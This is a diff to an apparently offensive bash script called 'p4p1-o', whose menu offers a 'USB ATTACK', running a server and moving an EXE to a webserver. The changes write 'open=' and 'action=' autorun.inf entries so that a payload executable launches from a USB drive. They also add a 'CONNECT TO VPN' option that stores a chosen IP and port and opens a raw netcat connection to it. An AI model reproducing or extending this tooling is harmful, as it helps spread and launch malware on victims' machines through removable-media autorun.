@@ -59,6 +59,8 @@ DESKTOP_PATH=~/Desktop
 UN_FILE=~/.p4p1-o/cfg/un.cfg
 PORT_FILE=~/.p4p1-o/cfg/port.cfg
 IP_FILE=~/.p4p1-o/cfg/ip.cfg
+VPN_PORT_FILE=~/.p4p1-o/cfg/vpn_port.cfg
+VPN_IP_FILE=~/.p4p1-o/cfg/vpn_ip.cfg
 VER_FILE=~/.p4p1-o/cfg/ver.cfg
 AUTORUN=autorun.inf
 MAKENAMEW32C=p4p1-o_32_Vx.exe
@@ -320,7 +322,8 @@ else
 		echo "[1] USB ATTACK"
 		echo "[2] I WILL FIGURE MY ATTACK MYSELF JUST CP THE EXE TO THE DESKTOP"
 		echo "[3] EXECUTE SERVER"
-		echo "[4] MOVE EXE TO WEBSERVER (only for linux)"
+		echo "[4] MOVE EXE TO WEBSERVER"
+		echo "[5] CONNECT TO VPN"
 		echo "[ANY_OTHER_NUMBER] EXIT"
 		read q
 
@@ -346,20 +349,23 @@ else
 
 				cp -v $W32EXE_PATH .
 				echo "open=$W32EXE" >> $AUTORUN
+				echo "action=$W32EXE" >> $AUTORUN
 
 			elif [ "$q" = "64"]; then
 
 				cp -v $W64EXE_PATH .
 				echo "open=$W64EXE" >> $AUTORUN
+				echo "action=$W64EXE" >> $AUTORUN
 
 			else
 
 				cp -v $LEXE_PATH .
 				echo "open=$LEXE" >> $AUTORUN
+				echo "action=$LEXE" >> $AUTORUN
 
 			fi
 
-			echo "action=Start ShellRun-CD" >> $AUTORUN
+
 			echo "[*] Created autorun"
 			echo "[*] Copied to file with exe and done!"
 
@@ -418,6 +424,29 @@ else
 				fi
 
 			fi
+
+		elif [ "$q" = "5" ];then
+			
+			if [[ ! -e "$VPN_PORT_FILE" && ! -e "$VPN_IP_FILE" ]]; then
+
+				echo "[*] Please enter ip of vpn"
+				read ip
+
+				echo "[*] Please enter port of vpn"
+				read port
+
+				echo $ip > $VPN_IP_FILE
+				echo $port > $VPN_PORT_FILE
+
+			else
+
+				ip=`cat $VPN_IP_FILE`
+				port=`cat $VPN_PORT_FILE`
+
+			fi
+
+			echo "[*] Connecting to vpn with netcat,"
+			nc $ip $port
 
 		else
 
